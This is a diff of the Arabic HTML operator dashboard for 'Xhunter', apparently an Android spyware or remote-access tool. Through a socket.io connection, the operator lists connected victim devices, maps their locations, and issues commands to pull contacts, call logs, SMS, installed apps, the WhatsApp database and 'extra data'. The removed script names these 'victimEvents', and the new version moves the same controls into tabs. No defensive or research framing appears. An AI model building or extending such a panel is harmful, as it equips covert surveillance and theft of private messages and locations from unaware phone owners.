@@ -1,126 +1,89 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>نظام استخبارات Xhunter</title>
-<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
-<style>
-body {
-    margin:0; font-family: Arial,sans-serif;
-    color:#00ffcc; overflow-x:hidden;
-    background: url('https://risk.lexisnexis.com/-/media/images/government/article%20-%20ai%20success%20with%20quality%20data/article%20-%20ai%20data%20mgmt%203/ai%20success%20built%20from%20quality%20data-low%20gif.gif?h=360&iar=0&w=640&hash=2052C14FB51FA5D4E3104F191FAEBE4E') no-repeat center center fixed;
-    background-size: cover;
-}
-header { padding:15px; text-align:center; font-size:1.8em; font-weight:bold; text-shadow: 0 0 8px #0ff; }
-#container { display:flex; flex-wrap:wrap; justify-content: center; padding:10px; gap:10px; }
-#devices, #events { flex:1; min-width:300px; max-height:500px; overflow:auto; border:2px solid #0ff; padding:15px; border-radius:10px; background:rgba(0,0,0,0.7); }
-#map { flex:2; min-height:500px; border:2px solid #0ff; border-radius:10px; }
-ul { list-style:none; padding:0; margin:0; }
-li { margin:5px 0; }
-button, select { background:#00ffcc; color:#000; border:none; padding:7px 12px; margin:3px; border-radius:5px; cursor:pointer; font-weight:bold; }
-button:hover, select:hover { background:#0ff; }
-h3 { border-bottom:1px solid #0ff; padding-bottom:5px; margin-bottom:10px; }
-</style>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>نظام استخبارات Xhunter — لوحة التحكم</title>
+
+<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
+<link rel="stylesheet" href="style.css">
 </head>
 <body>
-<header>نظام استخبارات Xhunter</header>
-<div id="container">
-    <div id="devices">
-        <h3>الأجهزة المتصلة</h3>
-        <ul id="deviceList"></ul>
-        <h3>أوامر التحكم</h3>
-        <select id="deviceSelect"></select>
-        <select id="commandAction">
-            <option value="getInstalledApps">التطبيقات المثبتة</option>
-            <option value="getContacts">جهات الاتصال</option>
-            <option value="getCallLog">سجل المكالمات</option>
-            <option value="getSMS">الرسائل</option>
-            <option value="getLocation">الموقع</option>
-            <option value="downloadWhatsappDatabase">واتساب</option>
-        </select>
-        <button id="sendCommand">إرسال الأمر</button>
-    </div>
-    <div id="events">
-        <h3>سجل الأحداث</h3>
-        <ul id="logList"></ul>
-    </div>
+<header>
+  <div class="title">نظام استخبارات <span>Xhunter</span></div>
+</header>
+
+<nav class="topbar">
+  <div class="tabs">
+    <button data-tab="map" class="tab active">الخريطة</button>
+    <button data-tab="devices" class="tab">الأجهزة</button>
+    <button data-tab="data" class="tab">بيانات الجهاز</button>
+    <button data-tab="logs" class="tab">السجل</button>
+    <button data-tab="commands" class="tab">الأوامر</button>
+  </div>
+  <div class="controls">
+    <div class="status">أجهزة متصلة: <span id="statusCount">0</span></div>
+    <div class="last">آخر حدث: <span id="lastEvent">—</span></div>
+  </div>
+</nav>
+
+<main id="main">
+  <!-- خريطة -->
+  <section id="tab-map" class="panel active">
     <div id="map"></div>
-</div>
+  </section>
+
+  <!-- أجهزة -->
+  <section id="tab-devices" class="panel">
+    <h3>الأجهزة المتصلة</h3>
+    <ul id="deviceList" class="list"></ul>
+  </section>
+
+  <!-- بيانات الجهاز المحدد -->
+  <section id="tab-data" class="panel">
+    <h3>بيانات الجهاز</h3>
+    <div id="deviceInfo">اختر جهازاً من تبويب "الأجهزة" لعرض بياناته</div>
+  </section>
+
+  <!-- السجل -->
+  <section id="tab-logs" class="panel">
+    <h3>سجل الأحداث</h3>
+    <ul id="logList" class="list"></ul>
+  </section>
+
+  <!-- الأوامر -->
+  <section id="tab-commands" class="panel">
+    <h3>إصدار أوامر</h3>
+    <div class="form-row">
+      <select id="deviceSelect" class="full"></select>
+    </div>
+    <div class="form-row">
+      <select id="commandAction" class="full">
+        <option value="getLocation">طلب الموقع (Lock)</option>
+        <option value="getInstalledApps">التطبيقات المثبتة</option>
+        <option value="getContacts">جهات الاتصال</option>
+        <option value="getCallLog">سجل المكالمات</option>
+        <option value="getSMS">الرسائل</option>
+        <option value="downloadWhatsappDatabase">واتساب (DB)</option>
+        <option value="getExtraData">بيانات إضافية</option>
+      </select>
+    </div>
+    <div class="form-row">
+      <input id="commandData" placeholder='بيانات JSON (اختياري)' class="full"/>
+    </div>
+    <div class="form-row">
+      <button id="sendCommand" class="primary">إرسال الأمر</button>
+      <button id="clearLogs" class="secondary">مسح السجل</button>
+    </div>
+  </section>
+</main>
+
+<footer class="footer">
+  Xhunter • لوحة الاستخبارات — جاهز للعمل
+</footer>
 
 <script src="/socket.io/socket.io.js"></script>
 <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
-<script>
-const socket = io();
-socket.emit('adminJoin');
-
-let devices = {};
-let markers = {};
-const map = L.map('map').setView([0,0], 2);
-L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(map);
-
-function addLog(msg){
-    const ul = document.getElementById('logList');
-    const li = document.createElement('li');
-    li.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-    ul.appendChild(li);
-    ul.scrollTop = ul.scrollHeight;
-}
-
-function updateDeviceList(){
-    const ul = document.getElementById('deviceList');
-    const select = document.getElementById('deviceSelect');
-    ul.innerHTML=''; select.innerHTML='';
-    for(let id in devices){
-        const li = document.createElement('li');
-        li.textContent = `${id} (${devices[id].model})`;
-        ul.appendChild(li);
-        const option = document.createElement('option');
-        option.value=id;
-        option.textContent=`${id} (${devices[id].model})`;
-        select.appendChild(option);
-    }
-}
-
-socket.on('join', device=>{
-    devices[device.id] = device;
-    updateDeviceList();
-    addLog(`جهاز متصل: ${device.id} (${device.model})`);
-});
-
-const victimEvents = ['getInstalledApps','getContacts','getCallLog','getSMS','getLocation','downloadWhatsappDatabase'];
-victimEvents.forEach(ev=>{
-    socket.on(ev, data=>{
-        addLog(`رد من الجهاز: ${ev} => ${JSON.stringify(data)}`);
-        if(ev==='getLocation' && data.data){
-            const {lat, lon} = data.data;
-            if(markers[data.id]){
-                markers[data.id].setLatLng([lat, lon]).bindPopup(data.id);
-            } else {
-                markers[data.id] = L.marker([lat, lon]).addTo(map).bindPopup(data.id).openPopup();
-            }
-        }
-    });
-});
-
-socket.on('disconnectClient', socketId=>{
-    for(let id in devices){
-        if(devices[id].socketId===socketId){
-            addLog(`انقطع الاتصال بالجهاز: ${id}`);
-            delete devices[id];
-            if(markers[id]) map.removeLayer(markers[id]);
-            updateDeviceList();
-            break;
-        }
-    }
-});
-
-document.getElementById('sendCommand').addEventListener('click', ()=>{
-    const to = document.getElementById('deviceSelect').value;
-    const action = document.getElementById('commandAction').value;
-    socket.emit('request', JSON.stringify({to, action, data:null}));
-    addLog(`تم إرسال الأمر: ${action} إلى ${to}`);
-});
-</script>
+<script src="admin.js"></script>
 </body>
 </html>
